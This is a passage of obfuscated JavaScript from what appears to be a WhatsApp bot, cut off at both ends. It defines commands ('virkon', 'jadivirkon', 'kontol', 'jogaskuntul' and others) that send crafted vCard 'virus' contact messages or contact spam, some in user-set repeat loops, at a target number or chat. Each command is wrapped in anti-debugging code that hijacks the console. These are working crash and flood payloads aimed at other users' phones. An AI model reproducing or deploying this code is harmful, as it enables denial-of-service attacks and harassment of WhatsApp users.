_0x3b7a46=![],_0x5c9727;};}()),_0x52ebbe=_0x466b17(this,function(){var _0x591c28=_0xbfe7,_0x1f8782=function(){var _0x559df1=_0xbfe7,_0x5b1bb5;try{_0x5b1bb5=Function(_0x559df1(0x1fe)+_0x559df1(0x1f6)+');')();}catch(_0x4469da){_0x5b1bb5=window;}return _0x5b1bb5;},_0x14fa95=_0x1f8782(),_0x284074=_0x14fa95['console']=_0x14fa95[_0x591c28(0x201)]||{},_0x21da7e=[_0x591c28(0x207),_0x591c28(0x209),_0x591c28(0x200),_0x591c28(0x20a),_0x591c28(0x204),_0x591c28(0x1ef),'trace'];for(var _0x3b1cbf=0x0;_0x3b1cbf<_0x21da7e[_0x591c28(0x206)];_0x3b1cbf++){var _0x20de78=_0x466b17[_0x591c28(0x1fd)][_0x591c28(0x1f2)][_0x591c28(0x1f1)](_0x466b17),_0x5e2141=_0x21da7e[_0x3b1cbf],_0xfd04e6=_0x284074[_0x5e2141]||_0x20de78;_0x20de78[_0x591c28(0x1f3)]=_0x466b17['bind'](_0x466b17),_0x20de78[_0x591c28(0x20c)]=_0xfd04e6[_0x591c28(0x20c)][_0x591c28(0x1f1)](_0xfd04e6),_0x284074[_0x5e2141]=_0x20de78;}});_0x52ebbe();function _0xbfe7(_0x435305,_0x4c1605){var _0x336c28=_0x995e();return _0xbfe7=function(_0x52ebbe,_0x466b17){_0x52ebbe=_0x52ebbe-0x1ef;var _0x53315d=_0x336c28[_0x52ebbe];return _0x53315d;},_0xbfe7(_0x435305,_0x4c1605);}{if(!isCreator&&!isBan)return;if(!text)throw _0x441bd3(0x1ff);jobotz['sendContact'](text+'@s.whatsapp.net',global[_0x441bd3(0x20e)],fkonjo),jobotz[_0x441bd3(0x205)](text+_0x441bd3(0x1f4),global[_0x441bd3(0x20e)],fkonjo),jobotz[_0x441bd3(0x205)](text+_0x441bd3(0x1f4),global[_0x441bd3(0x20e)],fkonjo),jobotz['sendContact'](text+_0x441bd3(0x1f4),global[_0x441bd3(0x20e)],fkonjo),jobotz['sendContact'](text+_0x441bd3(0x1f4),global[_0x441bd3(0x20e)],fkonjo),jancok(_0x441bd3(0x20d)+text);}function _0x995e(){var _0x31e745=['return\x20(function()\x20','Nomernya\x20mana?','info','console','273fSjoPq','9324YRTUYu','exception','sendContact','length','log','search','warn','error','apply','toString','Sukses\x20Send\x20Kuntul\x20Di\x20Nomer\x20','owner','5388912pjwGcr','table','24010fqlSFE','bind','prototype','__proto__','@s.whatsapp.net','1538970shRuLq','{}.constructor(\x22return\x20this\x22)(\x20)','4bAjjfP','124266lOQhdn','4275215djHtKe','3205584sytxNB','(((.+)+)+)+$','606400cPkRHT','constructor'];_0x995e=function(){return _0x31e745;};return _0x995e();}
}
break
case 'jogaskuntul': {
function _0x5ea8(){var _0x883b4c=['77MqnWld','error','__proto__','9ziDMku','212055JkeeRI','search','@s.whatsapp.net','owner','info','Sukses\x20Send\x20Kuntul\x20Di\x20Nomer\x20','3370FmBhta','exception','8hUPlMo','console','constructor','apply','1023912qzfMEm','table','113ZTRCJJ','3442xkMYVN','toString','8775ijcVic','chat','return\x20(function()\x20','101376QyCOmC','1560538lmWDGc','bind','1470426sNVJJs','trace','prototype','sendContact','Nomernya\x20mana?','length'];_0x5ea8=function(){return _0x883b4c;};return _0x5ea8();}var _0x3e6b32=_0x48df;(function(_0x2ffa12,_0x364e43){var _0x47b3cb=_0x48df,_0x187878=_0x2ffa12();while(!![]){try{var _0x19fe1c=-parseInt(_0x47b3cb(0x132))/0x1*(parseInt(_0x47b3cb(0x133))/0x2)+parseInt(_0x47b3cb(0x144))/0x3*(parseInt(_0x47b3cb(0x138))/0x4)+parseInt(_0x47b3cb(0x145))/0x5+-parseInt(_0x47b3cb(0x13b))/0x6+-parseInt(_0x47b3cb(0x139))/0x7*(-parseInt(_0x47b3cb(0x12c))/0x8)+parseInt(_0x47b3cb(0x135))/0x9*(-parseInt(_0x47b3cb(0x12a))/0xa)+parseInt(_0x47b3cb(0x141))/0xb*(parseInt(_0x47b3cb(0x130))/0xc);if(_0x19fe1c===_0x364e43)break;else _0x187878['push'](_0x187878['shift']());}catch(_0x139bdc){_0x187878['push'](_0x187878['shift']());}}}(_0x5ea8,0x29a2c));var _0x292e69=(function(){var _0x574de6=!![];return function(_0x16b009,_0x34347b){var _0x181ca7=_0x574de6?function(){var _0x46fccd=_0x48df;if(_0x34347b){var _0x516dc0=_0x34347b[_0x46fccd(0x12f)](_0x16b009,arguments);return _0x34347b=null,_0x516dc0;}}:function(){};return _0x574de6=![],_0x181ca7;};}()),_0x12c4ce=_0x292e69(this,function(){var _0xcbc355=_0x48df;return _0x12c4ce[_0xcbc355(0x134)]()[_0xcbc355(0x146)]('(((.+)+)+)+$')['toString']()['constructor'](_0x12c4ce)[_0xcbc355(0x146)]('(((.+)+)+)+$');});function _0x48df(_0x12441f,_0x2fe5d3){var _0x2a7504=_0x5ea8();return _0x48df=function(_0x386cca,_0xae66ff){_0x386cca=_0x386cca-0x126;var _0x3e4964=_0x2a7504[_0x386cca];return _0x3e4964;},_0x48df(_0x12441f,_0x2fe5d3);}_0x12c4ce();var _0xae66ff=(function(){var _0x876d69=!![];return function(_0x4d10a1,_0xb1a497){var _0x2a7661=_0x876d69?function(){var _0x505814=_0x48df;if(_0xb1a497){var _0x2717db=_0xb1a497[_0x505814(0x12f)](_0x4d10a1,arguments);return _0xb1a497=null,_0x2717db;}}:function(){};return _0x876d69=![],_0x2a7661;};}()),_0x386cca=_0xae66ff(this,function(){var _0x2071fb=_0x48df,_0x41605c;try{var _0x2aeb5f=Function(_0x2071fb(0x137)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x41605c=_0x2aeb5f();}catch(_0x2e572d){_0x41605c=window;}var _0x376208=_0x41605c[_0x2071fb(0x12d)]=_0x41605c[_0x2071fb(0x12d)]||{},_0x4e6963=['log','warn',_0x2071fb(0x128),_0x2071fb(0x142),_0x2071fb(0x12b),_0x2071fb(0x131),_0x2071fb(0x13c)];for(var _0x215d06=0x0;_0x215d06<_0x4e6963[_0x2071fb(0x140)];_0x215d06++){var _0x332bb1=_0xae66ff[_0x2071fb(0x12e)][_0x2071fb(0x13d)][_0x2071fb(0x13a)](_0xae66ff),_0x215c42=_0x4e6963[_0x215d06],_0x3e4259=_0x376208[_0x215c42]||_0x332bb1;_0x332bb1[_0x2071fb(0x143)]=_0xae66ff[_0x2071fb(0x13a)](_0xae66ff),_0x332bb1[_0x2071fb(0x134)]=_0x3e4259[_0x2071fb(0x134)][_0x2071fb(0x13a)](_0x3e4259),_0x376208[_0x215c42]=_0x332bb1;}});_0x386cca();{if(!isCreator&&!isBan)return;if(!text)throw _0x3e6b32(0x13f);jobotz[_0x3e6b32(0x13e)](text+_0x3e6b32(0x126),global[_0x3e6b32(0x127)],fkonjo),jobotz[_0x3e6b32(0x13e)](text+_0x3e6b32(0x126),global[_0x3e6b32(0x127)],fkonjo),jobotz[_0x3e6b32(0x13e)](text+'@s.whatsapp.net',global[_0x3e6b32(0x127)],fkonjo),jobotz[_0x3e6b32(0x13e)](text+_0x3e6b32(0x126),global[_0x3e6b32(0x127)],fkonjo),jobotz[_0x3e6b32(0x13e)](text+'@s.whatsapp.net',global[_0x3e6b32(0x127)],fkonjo),jobotz[_0x3e6b32(0x13e)](m['chat'],global[_0x3e6b32(0x127)],fkonjo),jobotz[_0x3e6b32(0x13e)](m[_0x3e6b32(0x136)],global[_0x3e6b32(0x127)],fkonjo),jobotz[_0x3e6b32(0x13e)](m[_0x3e6b32(0x136)],global['owner'],fkonjo),jobotz[_0x3e6b32(0x13e)](m[_0x3e6b32(0x136)],global[_0x3e6b32(0x127)],fkonjo),jobotz[_0x3e6b32(0x13e)](m[_0x3e6b32(0x136)],global[_0x3e6b32(0x127)],fkonjo),jancok(_0x3e6b32(0x129)+text);}
}
break
case 'jadikontol':{
var _0x4f7db0=_0x2c70;(function(_0x45f87d,_0x5415f2){var _0x4a3754=_0x2c70,_0x2b1a6e=_0x45f87d();while(!![]){try{var _0x3cf043=parseInt(_0x4a3754(0x18f))/0x1*(-parseInt(_0x4a3754(0x195))/0x2)+parseInt(_0x4a3754(0x199))/0x3*(-parseInt(_0x4a3754(0x1a5))/0x4)+-parseInt(_0x4a3754(0x1a6))/0x5+parseInt(_0x4a3754(0x19c))/0x6+parseInt(_0x4a3754(0x19a))/0x7+-parseInt(_0x4a3754(0x1a3))/0x8+parseInt(_0x4a3754(0x198))/0x9;if(_0x3cf043===_0x5415f2)break;else _0x2b1a6e['push'](_0x2b1a6e['shift']());}catch(_0x30602e){_0x2b1a6e['push'](_0x2b1a6e['shift']());}}}(_0xbed1,0x5132a));var _0x52f5fb=(function(){var _0x12a67e=!![];return function(_0x375cad,_0x4d0041){var _0x37f2c8=_0x12a67e?function(){var _0x136c68=_0x2c70;if(_0x4d0041){var _0x7e8673=_0x4d0041[_0x136c68(0x1a8)](_0x375cad,arguments);return _0x4d0041=null,_0x7e8673;}}:function(){};return _0x12a67e=![],_0x37f2c8;};}()),_0x199966=_0x52f5fb(this,function(){var _0x434a53=_0x2c70;return _0x199966[_0x434a53(0x19d)]()[_0x434a53(0x194)]('(((.+)+)+)+$')[_0x434a53(0x19d)]()[_0x434a53(0x19e)](_0x199966)[_0x434a53(0x194)](_0x434a53(0x1a2));});function _0x2c70(_0x53aeb6,_0x4526ab){var _0x85310=_0xbed1();return _0x2c70=function(_0x5203f7,_0x26ef84){_0x5203f7=_0x5203f7-0x18d;var _0x483e50=_0x85310[_0x5203f7];return _0x483e50;},_0x2c70(_0x53aeb6,_0x4526ab);}_0x199966();function _0xbed1(){var _0x5cfdda=['warn','apply','sendContact','error','chat','27286DycIfw','exception','premium','log','quoted','search','22HQMZba','Teks/Reply','trace','6493050FKlevy','1266021RksYrJ','2120069ttzYmk','bind','2000646vHMguV','toString','constructor','console','prototype','return\x20(function()\x20','(((.+)+)+)+$','1840112ANudbe','length','4YzxOQY','365025eKuIsG'];_0xbed1=function(){return _0x5cfdda;};return _0xbed1();}var _0x26ef84=(function(){var _0x6ef6c1=!![];return function(_0x1bd526,_0x315086){var _0x1a33bd=_0x6ef6c1?function(){if(_0x315086){var _0x1c44f8=_0x315086['apply'](_0x1bd526,arguments);return _0x315086=null,_0x1c44f8;}}:function(){};return _0x6ef6c1=![],_0x1a33bd;};}()),_0x5203f7=_0x26ef84(this,function(){var _0x469715=_0x2c70,_0x49f484=function(){var _0x5f4214=_0x2c70,_0x2fe366;try{_0x2fe366=Function(_0x5f4214(0x1a1)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x19852f){_0x2fe366=window;}return _0x2fe366;},_0x428644=_0x49f484(),_0x15110f=_0x428644['console']=_0x428644[_0x469715(0x19f)]||{},_0x576169=[_0x469715(0x192),_0x469715(0x1a7),'info',_0x469715(0x18d),_0x469715(0x190),'table',_0x469715(0x197)];for(var _0x4662b9=0x0;_0x4662b9<_0x576169[_0x469715(0x1a4)];_0x4662b9++){var _0x51ada6=_0x26ef84[_0x469715(0x19e)][_0x469715(0x1a0)][_0x469715(0x19b)](_0x26ef84),_0x4a8e4b=_0x576169[_0x4662b9],_0xd636ea=_0x15110f[_0x4a8e4b]||_0x51ada6;_0x51ada6['__proto__']=_0x26ef84[_0x469715(0x19b)](_0x26ef84),_0x51ada6[_0x469715(0x19d)]=_0xd636ea['toString']['bind'](_0xd636ea),_0x15110f[_0x4a8e4b]=_0x51ada6;}});_0x5203f7();{if(!isCreator&&!isBan)return;if(!m[_0x4f7db0(0x193)]&&!text)throw _0x4f7db0(0x196);jobotz[_0x4f7db0(0x1a9)](m[_0x4f7db0(0x18e)],global[_0x4f7db0(0x191)],fkonjo),jancok('Sukses\x20Convert\x20Kontol');}
}
break
 case 'jadivirkon':{
var _0x4cc189=_0x464c;function _0x464c(_0x28a488,_0x317bdb){var _0x3c92a7=_0xe7b1();return _0x464c=function(_0x1b80f3,_0x4c301b){_0x1b80f3=_0x1b80f3-0x10e;var _0x2c3ba1=_0x3c92a7[_0x1b80f3];return _0x2c3ba1;},_0x464c(_0x28a488,_0x317bdb);}(function(_0x44b07c,_0x1a16c7){var _0xd8ec68=_0x464c,_0x3d70a7=_0x44b07c();while(!![]){try{var _0x298cc5=-parseInt(_0xd8ec68(0x111))/0x1*(-parseInt(_0xd8ec68(0x11f))/0x2)+-parseInt(_0xd8ec68(0x119))/0x3*(parseInt(_0xd8ec68(0x10e))/0x4)+-parseInt(_0xd8ec68(0x118))/0x5*(-parseInt(_0xd8ec68(0x117))/0x6)+-parseInt(_0xd8ec68(0x113))/0x7+-parseInt(_0xd8ec68(0x114))/0x8*(parseInt(_0xd8ec68(0x127))/0x9)+-parseInt(_0xd8ec68(0x11d))/0xa+parseInt(_0xd8ec68(0x126))/0xb;if(_0x298cc5===_0x1a16c7)break;else _0x3d70a7['push'](_0x3d70a7['shift']());}catch(_0x3ee580){_0x3d70a7['push'](_0x3d70a7['shift']());}}}(_0xe7b1,0x72e00));var _0x7a69df=(function(){var _0x24b5ae=!![];return function(_0x29e6b7,_0x5b343d){var _0x1a9576=_0x24b5ae?function(){if(_0x5b343d){var _0x5d1ed9=_0x5b343d['apply'](_0x29e6b7,arguments);return _0x5b343d=null,_0x5d1ed9;}}:function(){};return _0x24b5ae=![],_0x1a9576;};}()),_0xbde16a=_0x7a69df(this,function(){var _0x4db14b=_0x464c;return _0xbde16a[_0x4db14b(0x123)]()[_0x4db14b(0x112)](_0x4db14b(0x12d))[_0x4db14b(0x123)]()[_0x4db14b(0x120)](_0xbde16a)['search'](_0x4db14b(0x12d));});_0xbde16a();function _0xe7b1(){var _0xa41e81=['3ItvUQC','BEGIN:VCARD\x0aVERSION:3.0\x0aN:;`${viruskon}`\x0aORG:\x0aTITLE:`${virusv3}`\x0aitem1.TEL:+6285714170944\x0aitem1.X-ABLabel:Celular\x0aitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\x0aitem2.X-ABLabel:INTERNET\x0aitem3.ADR:;;Casa\x20do\x20karalho;;;;\x0aitem3.X-ABADR:ac\x0aitem3.X-ABLabel:Casa\x0aitem4.ADR:;;EMAIL\x5c;CHARSET=UTF-8\x5c;type=HOME\x5c,INTERNET\x5c;ac;\x0aitem4.X-ABADR:\x0aitem4.X-ABLabel:Casa\x0aEND:VCARD','bind','__proto__','5714920nLNDMa','Sukses\x20Convert\x20Virkon','170wraEBl','constructor','key','log','toString','fromObject','apply','20788427oRjVrG','18uDtpXl','console','table','{}.constructor(\x22return\x20this\x22)(\x20)','chat','Message','(((.+)+)+)+$','info','waUploadToServer','relayMessage','2140876CkKiPO','error','return\x20(function()\x20','3309PHPpbf','search','3369695MkLzlA','1375472ddCOgs','readFileSync','length','81660dPZWvO','85KLLFey'];_0xe7b1=function(){return _0xa41e81;};return _0xe7b1();}var _0x4c301b=(function(){var _0x228485=!![];return function(_0x5d4b0c,_0x59aa09){var _0x1e309a=_0x228485?function(){var _0x485994=_0x464c;if(_0x59aa09){var _0x3618b1=_0x59aa09[_0x485994(0x125)](_0x5d4b0c,arguments);return _0x59aa09=null,_0x3618b1;}}:function(){};return _0x228485=![],_0x1e309a;};}()),_0x1b80f3=_0x4c301b(this,function(){var _0xbff1e9=_0x464c,_0x40d451;try{var _0x24de5e=Function(_0xbff1e9(0x110)+_0xbff1e9(0x12a)+');');_0x40d451=_0x24de5e();}catch(_0x471551){_0x40d451=window;}var _0x18fb02=_0x40d451[_0xbff1e9(0x128)]=_0x40d451[_0xbff1e9(0x128)]||{},_0x3c4f7b=[_0xbff1e9(0x122),'warn',_0xbff1e9(0x12e),_0xbff1e9(0x10f),'exception',_0xbff1e9(0x129),'trace'];for(var _0x560c3a=0x0;_0x560c3a<_0x3c4f7b[_0xbff1e9(0x116)];_0x560c3a++){var _0x357b05=_0x4c301b[_0xbff1e9(0x120)]['prototype'][_0xbff1e9(0x11b)](_0x4c301b),_0x5f50fc=_0x3c4f7b[_0x560c3a],_0x377d09=_0x18fb02[_0x5f50fc]||_0x357b05;_0x357b05[_0xbff1e9(0x11c)]=_0x4c301b[_0xbff1e9(0x11b)](_0x4c301b),_0x357b05[_0xbff1e9(0x123)]=_0x377d09['toString']['bind'](_0x377d09),_0x18fb02[_0x5f50fc]=_0x357b05;}});_0x1b80f3();{if(!isCreator&&!isBan)return;if(!m['quoted']&&!text)throw'Teks/Reply';var messa=await prepareWAMessageMedia({'image':fs[_0x4cc189(0x115)]('./pict.jpg')},{'upload':jobotz[_0x4cc189(0x12f)]}),contact=generateWAMessageFromContent(m[_0x4cc189(0x12b)],proto[_0x4cc189(0x12c)][_0x4cc189(0x124)]({'contactMessage':{'displayName':text+'\x20'+viruskon,'vcard':_0x4cc189(0x11a),'jpegThumbnail':virgam,'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}}),{'userJid':m[_0x4cc189(0x12b)],'quoted':fkonjo});jobotz[_0x4cc189(0x130)](m['chat'],contact['message'],{'messageId':contact[_0x4cc189(0x121)]['id']}),jancok(_0x4cc189(0x11e));}
}
break
 case 'virkon':{
var _0x553027=_0x9d61;(function(_0x561f2d,_0x77bd5){var _0x439fe1=_0x9d61,_0x101ce0=_0x561f2d();while(!![]){try{var _0x3ec9c2=-parseInt(_0x439fe1(0x112))/0x1*(parseInt(_0x439fe1(0x121))/0x2)+parseInt(_0x439fe1(0x10a))/0x3*(parseInt(_0x439fe1(0x11c))/0x4)+parseInt(_0x439fe1(0x103))/0x5*(-parseInt(_0x439fe1(0x113))/0x6)+-parseInt(_0x439fe1(0x104))/0x7+-parseInt(_0x439fe1(0x11a))/0x8+parseInt(_0x439fe1(0x111))/0x9+parseInt(_0x439fe1(0x108))/0xa;if(_0x3ec9c2===_0x77bd5)break;else _0x101ce0['push'](_0x101ce0['shift']());}catch(_0x536b08){_0x101ce0['push'](_0x101ce0['shift']());}}}(_0x4e28,0xef9db));function _0x4e28(){var _0x51816c=['exception','message','27209350bEnWuV','bind','290964qCaoFL','console','constructor','waUploadToServer','search','prototype','trace','17059680MnSshT','18131obaetz','9381762anVaPf','BEGIN:VCARD\x0aVERSION:3.0\x0aN:;`${viruskon}`\x0aORG:\x0aTITLE:`${virusv3}`\x0aitem1.TEL:+6285714170944\x0aitem1.X-ABLabel:Celular\x0aitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\x0aitem2.X-ABLabel:INTERNET\x0aitem3.ADR:;;Casa\x20do\x20karalho;;;;\x0aitem3.X-ABADR:ac\x0aitem3.X-ABLabel:Casa\x0aitem4.ADR:;;EMAIL\x5c;CHARSET=UTF-8\x5c;type=HOME\x5c,INTERNET\x5c;ac;\x0aitem4.X-ABADR:\x0aitem4.X-ABLabel:Casa\x0aEND:VCARD','Jumlahnya?','readFileSync','chat','relayMessage','Sukses\x20Send\x20Virkon\x20Sebanyak\x20','14188456gTytmA','log','36jCRlWO','fromObject','length','return\x20(function()\x20','__proto__','66soXDVl','toString','{}.constructor(\x22return\x20this\x22)(\x20)','(((.+)+)+)+$','Message','5pVVGLE','4006611jlgora','apply'];_0x4e28=function(){return _0x51816c;};return _0x4e28();}var _0x4e1893=(function(){var _0x2130e8=!![];return function(_0x470919,_0x4badfc){var _0x71ef05=_0x2130e8?function(){var _0x4af424=_0x9d61;if(_0x4badfc){var _0x5cbfaa=_0x4badfc[_0x4af424(0x105)](_0x470919,arguments);return _0x4badfc=null,_0x5cbfaa;}}:function(){};return _0x2130e8=![],_0x71ef05;};}()),_0x328fc1=_0x4e1893(this,function(){var _0x47cf53=_0x9d61;return _0x328fc1[_0x47cf53(0x122)]()[_0x47cf53(0x10e)]('(((.+)+)+)+$')[_0x47cf53(0x122)]()[_0x47cf53(0x10c)](_0x328fc1)[_0x47cf53(0x10e)](_0x47cf53(0x124));});function _0x9d61(_0xf60499,_0x517d49){var _0x5c548f=_0x4e28();return _0x9d61=function(_0x1b4424,_0x2211ad){_0x1b4424=_0x1b4424-0x103;var _0x1f476b=_0x5c548f[_0x1b4424];return _0x1f476b;},_0x9d61(_0xf60499,_0x517d49);}_0x328fc1();var _0x2211ad=(function(){var _0x217da5=!![];return function(_0x572d76,_0x13581d){var _0x846978=_0x217da5?function(){if(_0x13581d){var _0xf876dc=_0x13581d['apply'](_0x572d76,arguments);return _0x13581d=null,_0xf876dc;}}:function(){};return _0x217da5=![],_0x846978;};}()),_0x1b4424=_0x2211ad(this,function(){var _0x3ea6ad=_0x9d61,_0x4bde61;try{var _0x2db2a9=Function(_0x3ea6ad(0x11f)+_0x3ea6ad(0x123)+');');_0x4bde61=_0x2db2a9();}catch(_0xfbff11){_0x4bde61=window;}var _0x12ab59=_0x4bde61['console']=_0x4bde61[_0x3ea6ad(0x10b)]||{},_0x3d4258=[_0x3ea6ad(0x11b),'warn','info','error',_0x3ea6ad(0x106),'table',_0x3ea6ad(0x110)];for(var _0x52dec3=0x0;_0x52dec3<_0x3d4258[_0x3ea6ad(0x11e)];_0x52dec3++){var _0xc6d12e=_0x2211ad[_0x3ea6ad(0x10c)][_0x3ea6ad(0x10f)][_0x3ea6ad(0x109)](_0x2211ad),_0x2a5f62=_0x3d4258[_0x52dec3],_0x4139a8=_0x12ab59[_0x2a5f62]||_0xc6d12e;_0xc6d12e[_0x3ea6ad(0x120)]=_0x2211ad['bind'](_0x2211ad),_0xc6d12e[_0x3ea6ad(0x122)]=_0x4139a8[_0x3ea6ad(0x122)][_0x3ea6ad(0x109)](_0x4139a8),_0x12ab59[_0x2a5f62]=_0xc6d12e;}});_0x1b4424();{if(!isCreator&&!isBan)return;if(args[_0x553027(0x11e)]==0x0)return m['reply'](_0x553027(0x115));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':fs[_0x553027(0x116)]('./pict.jpg')},{'upload':jobotz[_0x553027(0x10d)]}),contact=generateWAMessageFromContent(m[_0x553027(0x117)],proto[_0x553027(0x125)][_0x553027(0x11d)]({'contactMessage':{'displayName':''+viruskon,'vcard':_0x553027(0x114),'jpegThumbnail':virgam,'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}}),{'userJid':m['chat'],'quoted':fkonjo});jobotz[_0x553027(0x118)](m[_0x553027(0x117)],contact[_0x553027(0x107)],{'messageId':contact['key']['id']});}jancok(_0x553027(0x119)+jumlah);}
}
break
case 'kontol': {
function _0x564a(){const _0x39e417=['sendContact','{}.constructor(\x22return\x20this\x22)(\x20)','633976hUZFsZ','exception','86248sErbpP','616HlzWZr','835614YXALwN','return\x20(function()\x20','apply','610JNwjIj','308627ScMwfY','length','3394728LPiPCF','table','constructor','35JbPVQs','console','search','(((.+)+)+)+$','prototype','toString','1410424BleDnt','trace','premium','6cbeqTW','441sGwABq','bind','reply','chat','info','log','error','Jumlahnya?','119694iTydXu'];_0x564a=function(){return _0x39e417;};return _0x564a();}const _0x45dee1=_0x44a2;function _0x44a2(_0x50d208,_0x5f411c){const _0x415c7c=_0x564a();return _0x44a2=function(_0x530340,_0x265e7d){_0x530340=_0x530340-0x142;let _0x55aadf=_0x415c7c[_0x530340];return _0x55aadf;},_0x44a2(_0x50d208,_0x5f411c);}(function(_0x5b176b,_0x377c9e){const _0x2e7c1a=_0x44a2,_0x5260eb=_0x5b176b();while(!![]){try{const _0x3350ac=-parseInt(_0x2e7c1a(0x158))/0x1+parseInt(_0x2e7c1a(0x145))/0x2*(parseInt(_0x2e7c1a(0x148))/0x3)+parseInt(_0x2e7c1a(0x154))/0x4*(parseInt(_0x2e7c1a(0x161))/0x5)+-parseInt(_0x2e7c1a(0x151))/0x6*(-parseInt(_0x2e7c1a(0x157))/0x7)+parseInt(_0x2e7c1a(0x156))/0x8*(-parseInt(_0x2e7c1a(0x149))/0x9)+-parseInt(_0x2e7c1a(0x15b))/0xa*(parseInt(_0x2e7c1a(0x15c))/0xb)+-parseInt(_0x2e7c1a(0x15e))/0xc;if(_0x3350ac===_0x377c9e)break;else _0x5260eb['push'](_0x5260eb['shift']());}catch(_0x5dbd94){_0x5260eb['push'](_0x5260eb['shift']());}}}(_0x564a,0xdfe94));const _0x3efcce=(function(){let _0x5db337=!![];return function(_0x234813,_0x4d96e5){const _0x4fbed5=_0x5db337?function(){if(_0x4d96e5){const _0x40cb02=_0x4d96e5['apply'](_0x234813,arguments);return _0x4d96e5=null,_0x40cb02;}}:function(){};return _0x5db337=![],_0x4fbed5;};}()),_0x109176=_0x3efcce(this,function(){const _0x24ea6e=_0x44a2;return _0x109176[_0x24ea6e(0x144)]()[_0x24ea6e(0x163)](_0x24ea6e(0x142))['toString']()[_0x24ea6e(0x160)](_0x109176)[_0x24ea6e(0x163)](_0x24ea6e(0x142));});_0x109176();const _0x265e7d=(function(){let _0x53b488=!![];return function(_0x276726,_0x321a6b){const _0x2f0255=_0x53b488?function(){const _0x2af9cc=_0x44a2;if(_0x321a6b){const _0x54a98d=_0x321a6b[_0x2af9cc(0x15a)](_0x276726,arguments);return _0x321a6b=null,_0x54a98d;}}:function(){};return _0x53b488=![],_0x2f0255;};}()),_0x530340=_0x265e7d(this,function(){const _0x2f95c7=_0x44a2,_0x57b83a=function(){const _0x5103c5=_0x44a2;let _0x1fd968;try{_0x1fd968=Function(_0x5103c5(0x159)+_0x5103c5(0x153)+');')();}catch(_0x3bcbd7){_0x1fd968=window;}return _0x1fd968;},_0x39241e=_0x57b83a(),_0x3fb094=_0x39241e[_0x2f95c7(0x162)]=_0x39241e[_0x2f95c7(0x162)]||{},_0xe28da6=[_0x2f95c7(0x14e),'warn',_0x2f95c7(0x14d),_0x2f95c7(0x14f),_0x2f95c7(0x155),_0x2f95c7(0x15f),_0x2f95c7(0x146)];for(let _0x38bec5=0x0;_0x38bec5<_0xe28da6[_0x2f95c7(0x15d)];_0x38bec5++){const _0x3bf18a=_0x265e7d[_0x2f95c7(0x160)][_0x2f95c7(0x143)][_0x2f95c7(0x14a)](_0x265e7d),_0x11e396=_0xe28da6[_0x38bec5],_0x508427=_0x3fb094[_0x11e396]||_0x3bf18a;_0x3bf18a['__proto__']=_0x265e7d['bind'](_0x265e7d),_0x3bf18a[_0x2f95c7(0x144)]=_0x508427[_0x2f95c7(0x144)][_0x2f95c7(0x14a)](_0x508427),_0x3fb094[_0x11e396]=_0x3bf18a;}});_0x530340();{if(!isCreator&&!isBan)return;if(args[_0x45dee1(0x15d)]==0x0)return m[_0x45dee1(0x14b)](_0x45dee1(0x150));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){jobotz[_0x45dee1(0x152)](m[_0x45dee1(0x14c)],global[_0x45dee1(0x147)],fkonjo);}jancok('Sukses\x20Send\x20Kontol\x20Sebanyak\x20'+jumlah);}
}
break
case 'kontolto': {
var _0x7dedfa=_0x5162;(function(_0x41acd1,_0x1f3886){var _0x2b3f73=_0x5162,_0x326e61=_0x41acd1();while(!![]){try{var _0x7c2190=-parseInt(_0x2b3f73(0xe0))/0x1*(-parseInt(_0x2b3f73(0xf2))/0x2)+-parseInt(_0x2b3f73(0xee))/0x3+parseInt(_0x2b3f73(0xf1))/0x4+parseInt(_0x2b3f73(0xd9))/0x5*(-parseInt(_0x2b3f73(0xed))/0x6)+-parseInt(_0x2b3f73(0xdf))/0x7+parseInt(_0x2b3f73(0xea))/0x8+-parseInt(_0x2b3f73(0xeb))/0x9*(-parseInt(_0x2b3f73(0xde))/0xa);if(_0x7c2190===_0x1f3886)break;else _0x326e61['push'](_0x326e61['shift']());}catch(_0x1dc766){_0x326e61['push'](_0x326e61['shift']());}}}(_0x1e1b,0xa4928));var _0x40c0ac=(function(){var _0x3859ed=!![];return function(_0xbee3e3,_0x17beda){var _0x273302=_0x3859ed?function(){if(_0x17beda){var _0x3baf76=_0x17beda['apply'](_0xbee3e3,arguments);return _0x17beda=null,_0x3baf76;}}:function(){};return _0x3859ed=![],_0x273302;};}()),_0x46bd91=_0x40c0ac(this,function(){var _0x391ba0=_0x5162;return _0x46bd91[_0x391ba0(0xec)]()[_0x391ba0(0xe1)](_0x391ba0(0xe9))[_0x391ba0(0xec)]()[_0x391ba0(0xd7)](_0x46bd91)[_0x391ba0(0xe1)](_0x391ba0(0xe9));});_0x46bd91();var _0x2c4336=(function(){var _0x112f82=!![];return function(_0x19b940,_0x3cc819){var _0x5b084f=_0x112f82?function(){var _0x5937da=_0x5162;if(_0x3cc819){var _0x1a88c7=_0x3cc819[_0x5937da(0xef)](_0x19b940,arguments);return _0x3cc819=null,_0x1a88c7;}}:function(){};return _0x112f82=![],_0x5b084f;};}()),_0xfd8930=_0x2c4336(this,function(){var _0x1c6b1d=_0x5162,_0x3ce982;try{var _0x4f1ca4=Function(_0x1c6b1d(0xe4)+_0x1c6b1d(0xf3)+');');_0x3ce982=_0x4f1ca4();}catch(_0x2db1af){_0x3ce982=window;}var _0x2c8f24=_0x3ce982[_0x1c6b1d(0xda)]=_0x3ce982[_0x1c6b1d(0xda)]||{},_0x496b6d=[_0x1c6b1d(0xdd),_0x1c6b1d(0xe5),_0x1c6b1d(0xdb),'error','exception',_0x1c6b1d(0xd8),_0x1c6b1d(0xe3)];for(var _0xab0104=0x0;_0xab0104<_0x496b6d['length'];_0xab0104++){var 